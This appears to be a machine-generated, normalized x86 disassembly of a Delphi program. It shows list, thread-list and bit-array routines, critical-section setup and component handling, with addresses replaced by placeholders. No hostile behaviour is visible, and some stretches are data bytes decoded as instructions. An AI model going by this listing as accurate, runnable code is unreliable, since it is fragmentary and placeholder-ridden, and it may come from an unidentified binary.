call sub_414108
mov edx [ eax ]
call [ edx + 0xc ]
inc esi
dec ebx
jne r-xdata
sub_413dc4
push ebx
push esi
call sub_405cc8
mov eax [ eax + 0x8 ]
call sub_403124
call sub_405cc8
mov ebx [ eax + 0xc ]
mov eax ebx
call sub_4141f0
mov esi eax
call sub_405cc8
mov [ eax + 0x8 ] esi
mov edx [ ebx + 0x8 ]
dec edx
mov eax ebx
call sub_413ff8
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
call sub_405cc8
xor edx edx
mov [ eax + 0xc ] edx
mov eax ebx
call sub_403124
sub_413e20
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
xor edx edx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_413eb6
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
cmp esi [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413ebd
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
mov eax [ ebp + 0x8 ]
cmp esi [ eax - 0x8 ]
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_4030b0
call sub_413e20
pop ecx
mov ebx eax
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_403074
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_40415c
mov eax [ ebp - 0x4 ]
push eax
mov eax esi
call sub_404f44
call sub_404f94
mov edx eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x4 ]
pop eax
call sub_413cb8
or bl al
sub_413ec8
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_413f76
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
sete [ ebp - 0xa ]
cmp [ ebp - 0xa ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_413f57
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x4 ]
call sub_40306c
call sub_413e20
pop ecx
mov [ ebp - 0x9 ] al
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_413d3c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413f5e
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_413d94
retn
call sub_413dc4
sub_413f8c
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_413fac
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x8 ]
cmp esi [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax esi
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_413ff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_414094
cmp esi [ ebx + 0x8 ]
jl r-xdata
test edi edi
je r-xdata
sub eax esi
mov ecx eax
shl ecx 0x2
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 + 0x4 ]
call sub_4028e0
mov edx esi
mov eax ebx
call sub_414108
mov edi eax
dec [ ebx + 0x8 ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cl 0x2
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_41405c
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_414058
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a4
jmp sub_4038b0
sub_414094
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi ecx
mov ebx edx
xor eax eax
push ebp
push sub_4140dc
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_405a5c
mov edx [ ebp - 0x4 ]
mov ecx esi
mov eax [ r-xdata ]
call sub_41405c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4140e3
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
sub_414108
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_414094
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + esi * 4 ]
pop esi
pop ebx
retn
sub_414130
mov edx [ eax + 0xc ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov ecx edx
test ecx ecx
jns r-xdata
mov ecx 0x4
mov ecx 0x10
jmp r-xdata
sar ecx 0x2
jmp r-xdata
add ecx 0x3
add ecx edx
mov edx ecx
call sub_4142c4
retn
sub_414164
push ebx
xor ecx ecx
jmp r-xdata
cmp ecx [ eax + 0x8 ]
jge r-xdata
cmp ecx [ eax + 0x8 ]
jne r-xdata
mov ebx [ eax + 0x4 ]
cmp edx [ ebx + ecx * 4 ]
jne r-xdata
mov eax ecx
pop ebx
retn
or ecx 0xffffffff
inc ecx
sub_414184
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_414094
cmp esi [ ebx + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
sub eax esi
mov ecx eax
shl ecx 0x2
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 + 0x4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 ]
call sub_4028e0
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_4141fc
push ebx
push esi
push edi
push ebp
mov esi ecx
mov edi edx
mov ebx eax
cmp esi edi
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_414094
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov edx edi
mov eax ebx
call sub_414108
mov ebp eax
mov eax [ ebx + 0x4 ]
xor edx edx
mov [ eax + edi * 4 ] edx
mov edx edi
mov eax ebx
call sub_413ff8
xor ecx ecx
mov edx esi
mov eax ebx
call sub_414184
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] ebp
sub_414254
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_414094
cmp esi [ ebx + 0x8 ]
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov [ edx + esi * 4 ] edi
test eax eax
je r-xdata
mov edx [ ebx + 0x4 ]
mov eax [ edx + esi * 4 ]
cmp edi eax
je r-xdata
test edi edi
je r-xdata
mov cl 0x2
mov edx eax
mov eax ebx
mov esi [ eax ]
call [ esi + 0x4 ]
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_4142a4
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_414164
mov esi eax
test esi esi
jl r-xdata
mov eax esi
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_413ff8
sub_4142c4
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_414094
cmp esi 0x7ffffff
jle r-xdata
pop esi
pop ebx
retn
mov edx esi
shl edx 0x2
lea eax [ ebx + 0x4 ]
call sub_402724
mov [ ebx + 0xc ] esi
cmp esi [ ebx + 0xc ]
je r-xdata
sub_414300
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_414094
cmp esi 0x7ffffff
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_4142c4
cmp esi [ ebx + 0xc ]
jle r-xdata
mov ebp eax
dec ebp
mov edi esi
sub edi ebp
jg r-xdata
mov edx [ ebx + 0x4 ]
lea edx [ edx + eax * 4 ]
mov ecx esi
sub ecx eax
mov eax ecx
shl eax 0x2
xor ecx ecx
xchg edx eax
call sub_402b40
jmp r-xdata
mov [ ebx + 0x8 ] esi
pop ebp
pop edi
pop esi
pop ebx
retn
dec edi
mov edx ebp
mov eax ebx
call sub_413ff8
dec ebp
inc edi
jne r-xdata
sub_414374
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4030f4
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ esi + 0x4 ] eax
mov [ esi + 0x20 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax esi
pop esi
pop ebx
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_4143c8
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_4034b0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4144cc
xor eax eax
push ebp
push sub_41442a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_403124
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_403114
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414431
mov eax [ ebp - 0x4 ]
call sub_414530
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
call DeleteCriticalSection
retn
sub_414444
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4144cc
xor eax eax
push ebp
push sub_4144c0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_413fac
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_414164
inc eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4144c7
mov eax [ ebp - 0x4 ]
call sub_414530
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x2
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax ]
mov ecx ebx
call sub_414094
sub_4144e0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4144cc
xor eax eax
push ebp
push sub_414523
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_4142a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41452a
mov eax [ ebp - 0x4 ]
call sub_414530
retn
sub_41453c
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_414590
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403114
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_414590
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x4 ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test esi esi
jge r-xdata
lea eax [ esi + 0x20 ]
dec eax
test eax eax
jns r-xdata
mov eax ebx
call sub_41456c
sar eax 0x5
mov edi eax
shl edi 0x2
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
add eax 0x1f
sar eax 0x5
mov ebp eax
shl ebp 0x2
cmp ebp edi
je r-xdata
add eax 0x1f
mov [ ebx + 0x4 ] esi
xor eax eax
mov [ esp ] eax
test edi edi
je r-xdata
test ebp ebp
je r-xdata
mov eax edi
call sub_4026e4
mov [ esp ] eax
mov eax [ esp ]
xor ecx ecx
mov edx edi
call sub_402b40
mov eax [ esp ]
mov [ ebx + 0x8 ] eax
cmp [ esp ] 0x0
je r-xdata
mov edx ebp
mov eax [ ebx + 0x8 ]
call sub_402704
mov edx edi
mov eax ebp
call sub_414584
mov ecx eax
mov edx [ esp ]
mov eax [ ebx + 0x8 ]
call sub_4028e0
sub_414634
cmp edx [ eax + 0x4 ]
jae r-xdata
cmp edx 0x0
jl sub_41456c
mov eax [ eax + 0x8 ]
or cl cl
je r-xdata
push eax
push edx
push ecx
inc edx
call sub_414590
pop ecx
pop edx
pop eax
jmp r-xdata
btr [ eax ] edx
retn
bts [ eax ] edx
retn
sub_414678
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
sar eax 0x5
dec eax
test eax eax
jl r-xdata
add eax 0x1f
mov eax [ ebx + 0x4 ]
inc eax
mov [ esp ] eax
xor esi esi
inc esi
dec [ esp ]
jne r-xdata
mov eax [ ebx + 0x8 ]
mov edi [ eax + esi * 4 ]
xor eax eax
mov eax [ ebx + 0x8 ]
mov edx [ r-xdata ]
cmp edx [ eax + esi * 4 ]
je r-xdata
jb r-xdata
and edx 0x7f
bt edi edx
inc eax
cmp al 0x20
jne r-xdata
mov edx esi
shl edx 0x5
and eax 0x7f
add edx eax
mov eax edx
mov edx [ ebx + 0x4 ]
cmp eax edx
jl r-xdata
mov edx eax
cmp dl 0x1f
ja r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax edx
jmp r-xdata
sub_4146f0
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
mov eax esi
call sub_4177c0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403114
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_414730
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4147e6
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403f90
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_403074
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_40415c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_403074
lea eax [ ebp - 0x104 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0x4
lea eax [ ebp - 0x114 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b760
call sub_4038b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4147ed
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
sub_41480c
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4148a1
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_403074
lea edx [ ebp - 0x104 ]
mov eax edi
call sub_40415c
mov eax ebx
mov si 0xffff
call sub_403320
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4148a8
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
mov eax ebx
mov si 0xffff
call sub_403320
lea edx [ ebp - 0x4 ]
mov si 0xfffe
call sub_403320
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push r-xdata
push [ edi ]
mov eax edi
mov edx 0x3
call sub_404278
sub_4148b3
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ebx ] dh
rol bl 0x90
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_403378
mov eax ebx
mov si 0xffff
call sub_403320
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffff
call sub_403320
push eax
lea eax [ ebx + 0x4 ]
call sub_405598
mov ecx eax
mov edx r-xdata
pop eax
call sub_4031d8
sub_4148fe
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
pop ebp
retn 0x4
sub_414930
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
jmp r-xdata
pop ebp
retn 0x4
sub_414950
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_4031d8
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_414978
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
je r-xdata
mov eax edi
call sub_405598
test ebx ebx
je r-xdata
xor eax eax
mov [ edi ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax ebx
mov si 0xffff
call sub_403320
mov esi eax
test esi esi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
mov eax edi
call sub_405598
mov edx eax
mov eax esi
call sub_414978
test [ ebx + 0x1c ] 0x10
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax edi
call sub_405598
push eax
push r-xdata
push ebx
mov eax [ ebx ]
call [ eax + 0x28 ]
jmp r-xdata
sub_414a10
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_414a65
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_405598
mov edx eax
mov eax edi
call sub_414978
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414a6c
lea eax [ ebp - 0x4 ]
call sub_405598
retn
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_414a74
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx ecx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax esi
pop esi
pop ebx
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_414aac
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4146f0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_414adc
push esi
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
pop esi
retn
cmp [ esi + 0xc ] 0x0
jne r-xdata
test dl dl
je r-xdata
mov edx eax
xor edx edx
jmp r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x1c ]
sub_414b18
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
mov edx esp
mov eax [ ebx ]
call sub_403074
mov edx esp
mov eax esi
call sub_40415c
add esp 0x100
pop esi
pop ebx
retn
sub_414b40
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_414bd5
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x4 ] 0x0
je r-xdata
lea edx [ ebp - 0x114 ]
mov eax [ ebx ]
call sub_403074
lea edx [ ebp - 0x114 ]
mov eax edi
call sub_40415c
push edi
lea edx [ ebp - 0x14 ]
mov eax [ ebx + 0x4 ]
mov si 0xfffe
call sub_403320
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
mov eax ebx
call sub_414b00
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x10 ]
mov ecx 0x1
mov eax r-xdata
call sub_408d28
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414bdc
lea eax [ ebp - 0x14 ]
call sub_403ef8
retn
sub_414bf8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_4150c8
mov edx ebx
mov eax esi
call sub_415060
sub_414c28
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_414b00
test eax eax
jl r-xdata
pop esi
pop ebx
retn
cmp esi eax
je r-xdata
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x8 ]
mov ecx esi
xchg edx eax
call sub_4141fc
mov dl 0x1
mov eax ebx
call sub_414adc
sub_414c58
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ esi + 0x8 ] eax
xor ecx ecx
mov edx esi
mov eax esi
call sub_414a10
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax esi
pop esi
pop ebx
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_414ca4
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
mov [ esi + 0xc ] 0x1
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov cl 0x1
mov edx esi
mov eax esi
call sub_414a10
mov eax [ esi + 0x8 ]
call sub_403124
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4146f0
test bl bl
jle r-xdata
mov eax esi
call sub_414dbc
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_414cf0
push ebx
push ecx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ ebx + 0x4 ]
call [ eax + 0x1c ]
mov [ esp ] eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ esp ]
pop edx
pop ebx
retn
sub_414d10
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax esi
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_41471c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_414d8e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_414dbc
mov eax esi
call sub_414e60
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
inc ebx
xor edi edi
mov edx edi
mov eax esi
call sub_414e68
push eax
mov eax [ ebp - 0x4 ]
call sub_414cf0
pop edx
mov ecx [ eax ]
call [ ecx + 0x8 ]
inc edi
dec ebx
jne r-xdata
sub_414dbc
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_414e16
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
cmp [ ebx + 0x8 ] 0x0
jg r-xdata
mov eax ebx
call sub_4141f0
call sub_403124
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
sub_414e40
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
mov edx esi
mov eax ebx
call sub_414e68
mov edx [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
pop esi
pop ebx
pop ebp
retn 0x4
sub_414e7c
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_414f2a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x108 ]
mov eax [ ebx ]
call sub_403074
lea edx [ ebp - 0x108 ]
mov eax edi
call sub_40415c
mov eax ebx
mov si 0xffff
call sub_403320
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414f31
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f1c
retn
mov eax ebx
mov si 0xffff
call sub_403320
lea edx [ ebp - 0x4 ]
mov si 0xfffe
call sub_403320
cmp [ ebp - 0x4 ] 0x0
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_414f44
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0x8 ]
mov eax edi
mov edx 0x3
call sub_404278
sub_414f44
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
call sub_403f4c
mov eax [ ebp - 0x4 ]
mov si 0xffff
call sub_403320
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_403364
test eax eax
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_403364
call sub_410b84
mov ebx eax
test ebx ebx
je r-xdata
cmp [ ebx + 0x8 ] 0x0
je r-xdata
movsx eax [ ebx + 0x8 ]
shl eax 0x2
call sub_4026e4
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_415041
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_403364
mov edx [ ebp - 0xc ]
call sub_410cb0
movsx edi [ ebx + 0x8 ]
dec edi
test edi edi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_402704
retn
inc edi
xor ebx ebx
inc ebx
dec edi
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + ebx * 4 ]
mov eax [ ebp - 0x10 ]
call sub_410d04
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0xc ]
mov esi [ eax + ebx * 4 ]
mov eax [ esi ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x14
lea edx [ esi + 0x1a ]
call sub_40415c
sub_415060
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x4 ]
call sub_4032b0
test al al
jne r-xdata
mov edx esi
